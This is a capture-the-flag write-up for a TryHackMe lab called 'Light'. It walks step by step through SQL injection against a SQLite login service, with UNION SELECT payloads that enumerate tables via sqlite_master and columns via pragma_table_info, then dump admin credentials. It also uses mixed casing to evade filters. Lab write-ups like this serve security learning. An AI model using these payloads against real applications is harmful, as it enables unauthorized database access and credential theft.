 # tryhackme-write_up-light- 
 In this CTF, we explore a database application called "Light" reachable via a TCP socket. The main challenge is to perform an SQL Injection to retrieve the administrator's credentials and the flag.

## Connection
First, we establish a TCP socket connection to the target service on port 1337:
`nc <MACHINE_IP> 1337`

Once connected, we interact with the login prompt.

## Step 1: SQL Injection Discovery 
we write smokey the example in the THM and then after we see the password ,
We try to see if the application is vulnerable to SQL Injection by inputting a single quote `'`:
`Please enter your username: ' UniOn SeLeCt 1 '`
`Password: 1`

This confirmed that we can execute SQL queries.

## Step 2: Database Enumeration
We need to find the database tables. We use `sqlite_master` to retrieve the database schema:
`Please enter your username: ' UniOn SeLeCt group_concat(name) FROM sqlite_master '`
`Password: usertable,admintable`

**Explanation:**
- **`UniOn SeLeCt`**: We use mixed casing to bypass potential input filters.
- **`group_concat(name)`**: Aggregates the table names into one readable string.
- **`FROM sqlite_master`**: we certainly do not know all the tables name .so we must use it to give us the names of the tables 

## Step 3: Column Discovery
Now that we have the table name `admintable`, we need to know its structure (columns):
`Please enter your username: ' UniOn SeLeCt group_concat(name) FROM pragma_table_info('admintable') '`
`Password: id,username,password`

**Explanation:**
- **`pragma_table_info('admintable')`**: A special SQLite function that provides metadata about the specified table.
- ** ('admintable') mean to the os give me information about its      and we add group_concat(name)  to make it give us only the tables name 
## Step 4: Data Exfiltration
Finally, we retrieve the values from the columns we discovered:
`Please enter your username: ' UniOn SeLeCt group_concat( enter_value_here  ) FROM admintable '`
`Password:" password WE NEED ",THM{ FIND_THE_FLAG_BY_YOURSELF }`


---
"Remember that SQL injection isn't just about the payload; it's about understanding how the system thinks. I hope this breakdown helps you get past any roadblocks, but don't just copy the steps—try to play with them and see what happens
                                  GOOD LUCK!
